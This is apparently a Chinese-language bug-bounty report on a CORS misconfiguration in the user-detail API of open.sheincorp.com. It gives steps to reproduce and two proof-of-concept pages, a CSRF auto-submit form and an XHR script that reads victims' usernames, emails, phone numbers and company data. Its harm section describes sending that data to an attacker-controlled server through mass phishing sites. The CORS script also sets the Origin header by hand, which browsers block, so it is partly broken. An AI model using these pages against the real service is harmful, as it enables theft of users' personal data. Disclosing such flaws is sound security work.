url:https://open.sheincorp.com/register
先注册一个账号，然后登录。

进去之后点击基本信息

抓包会看到这样一个包

可以看到它可以返回用户信息，而且这里是没有token的，可以看到这里有同源策略
加一个origion头

可以看到依然能返回数据，这里存在cors配置不当
以下是验证poc
<html>
  <!-- PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://open.sheincorp.com/api/external/user/queryExternalUserDetailVoById">
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

效果：


可以获得uername,email,userid,mobile,公司名称，开发者企业注册地，用户公司信息
危害：稍微修改一下poc，把csrf poc改成cors poc就行。把获取的信息传输到自己可以控制的服务器，就能通过大量散发钓鱼网站，获得大量用户敏感信息
Poc
<!DOCTYPE html>
<html>
  <head>
    <title>CORS PoC</title>
  </head>
  <body>
    <script>
      const xhr = new XMLHttpRequest();
      xhr.open('POST', 'https://open.sheincorp.com/api/external/user/queryExternalUserDetailVoById', true);
      xhr.setRequestHeader('Content-Type', 'text/plain');
      xhr.setRequestHeader('Origin', 'https://your-website.com'); // Replace with your trusted domain
      xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
          if (xhr.status === 200) {
            console.log('CORS request successful!');
            console.log(xhr.responseText);
          } else {
            console.error('CORS request failed.');
          }
        }
      };
      xhr.send();
    </script>
  </body>
</html>
